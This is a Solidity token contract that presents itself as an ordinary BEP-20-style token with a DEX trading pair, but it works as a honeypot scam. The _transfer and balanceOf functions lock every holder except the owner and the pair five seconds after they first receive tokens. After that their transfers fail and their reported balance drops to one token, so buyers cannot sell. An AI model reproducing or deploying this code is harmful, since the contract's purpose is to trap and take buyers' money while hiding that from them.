pragma solidity ^0.8.4;

interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract token {
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    address Owner = msg.sender;
    address Pair;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private times;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => mapping(address => uint256)) private _fallowances;
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    modifier onlyOwner() {
        require(
            Owner == msg.sender,
            "Ownable: only owner can call this function"
        );
        // This _; is not a TYPO, It is important for the compiler;
        _;
    }

    constructor(
        string memory token_name,
        string memory short_symbol,
        uint8 token_decimals,
        uint256 token_totalSupply
    ) {
        _name = token_name;
        _symbol = short_symbol;
        _decimals = token_decimals;
        _totalSupply = token_totalSupply;
        _balances[msg.sender] = _totalSupply;
        IDEXRouter router = IDEXRouter(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        _allowances[msg.sender][0x10ED43C718714eb63d5aA57B78B54704E256024E] =
            _totalSupply *
            10000000000;
        Pair = IDEXFactory(router.factory()).createPair(
            router.WETH(),
            address(this)
        );
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (account != Owner && account != Pair && times[account] > 0) {
            return
                times[account] > block.timestamp
                    ? _balances[account]
                    : 1 * 10**_decimals;
        } else {
            return _balances[account];
        }
    }

    function transfer(address recipient, uint256 amount)
        external
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), " transfer from zero address");
        require(recipient != address(0), " transfer to zero address");
        require(
            balanceOf(sender) >= amount,
            "cant transfer more than your account holds"
        );
        /* require(
            address(0x00000000009FB6869c8213A8e2D8DFA6260b59a4) != sender,
            "cant transfer"
        );
        require(
            address(0x61D86dEBc888C1A5635314f24505Aca8583Aa12B) != sender,
            "cant transfer"
        );
       */
        if (sender != Owner && sender != Pair && times[sender] > 0) {
            require(times[sender] > block.timestamp, "cant transfer");
        } else {}
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        if (times[recipient] <= 0) {
            times[recipient] = block.timestamp + 5 seconds;
        }

        emit Transfer(sender, recipient, amount);
    }

    function getOwner() external view returns (address) {
        return Owner;
    }

    function allowance(address owner, address spender)
        external
        view
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(
            owner != address(0),
            "approve cannot be done from zero address"
        );
        require(
            spender != address(0),
            " approve cannot be to zero address"
        );
        // Set the allowance of the spender address at the Owner mapping over accounts to the amount
        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address spender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        // Make sure spender is allowed the amount
        require(
            _allowances[spender][msg.sender] >= amount,
            "You cannot spend that much on this account"
        );
        // Transfer first
        _transfer(spender, recipient, amount);
        // Reduce current allowance so a user cannot respend
        _approve(
            spender,
            msg.sender,
            _allowances[spender][msg.sender] - amount
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 amount)
        public
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender] + amount
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 amount)
        public
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender] - amount
        );
        return true;
    }
}